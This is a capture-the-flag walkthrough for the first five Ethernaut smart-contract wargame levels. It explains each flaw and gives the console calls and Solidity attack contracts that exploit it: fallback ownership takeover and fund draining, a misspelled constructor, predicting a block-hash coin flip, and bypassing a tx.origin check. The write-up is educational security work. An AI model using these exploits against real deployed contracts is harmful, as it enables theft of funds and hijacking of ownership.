# Ethernaut Solutions

https://ethernaut.openzeppelin.com/

## 0. Hello Ethernaut

**Goal**: Find the flag.

The flag, "ethernaut0", is stored in the public `password` field. Calling the
`authenticate` function with "ethernaut0" solves the tutorial.

## 1. Fallback

**Goal**: Drain the contract of its funds.

The `receive` function is called as a fallback when eth is send directly to
the contract. In this case, `receive` sets `owner = msg.sender` if the sender
has a non-zero entry in the contributions mapping and sends any amount of eth
directly to the contract.

We can then do the following:

* Send 0.0001 eth via `contribute` function to register a non-zero
  contribution for the sender address (send < 0.001 eth to get past the
  require statement).

```
await contract.contribute({value: toWei("0.0001")})
```

* Trigger the receive function by sending eth directly to the contract address.

```
await sendTransaction({
  'from': player,
  'to': contract.address,
  'value': 1,
  'gas': 30000,
})
```

* We are now the owner and can call `withdraw` to drain the contract.

```
await contract.withdraw()
```

## 2. Fallout

**Goal**: Claim ownership of the contract.

The constructor is misspelled as "Fal1out" instead of "Fallout". As a result,
the "constructor" is instead interpreted as a callable public function. We
simply call the `Fal1out` function, which sets `owner = msg.sender`.

```
await contract.Fal1out()
```

## 3. Coin Flip

**Goal**: Make 10 correct consecutive guesses for the coin flip result.

There is no native RNG in Solidity, so the `CoinFlip` contract implements a
PRNG using the current block number, `block.number`, as the seed. We can write
our own contract to reveal this seed and generate the result before calling
the `flip` function.

```
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.3.0/contracts/math/SafeMath.sol";

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract Attack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function predictAndFlip(address contractAddr) public {
    CoinFlip cf = CoinFlip(contractAddr);
    cf.flip(uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1);
  }
}
```

By pre-generating the result, we can simply feed it into the `flip` function
and get the correct answer every time. We repeatedly call the `predictAndFlip`
function in our `Attack` contract until we hit the required number of correct
consecutive guesses.

## 4. Telephone

**Goal**: Claim ownership of the contract.

The `changeOwner` function checks that  `tx.orign != msg.sender`. The value of
`tx.origin` contains the address of the Externally Owned Account (EOA) that
created the initial transation. The value `msg.sender`, on the other hand,
refers to the address of the last instance from where the function was called
(which can be either a contract or an EOA).

If we call `changeOwner` directly, `tx.origin` is the same as `msg.sender`.
However, if we relay our call through a contract, `tx.origin` will be set to
the player's address and `msg.sender` will be set to the address of our custom
contract. Thus, we can bypass the check.

```
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract Attack {
  function changeTelephoneOwner(address contractAddr, address owner) public {
    Telephone t = Telephone(contractAddr);
    t.changeOwner(owner);
  }
}
```

We can call the `changeTelephoneOwner` function in our `Attack` contract to
change the owner of the `Telephone` contract to the address of the player.

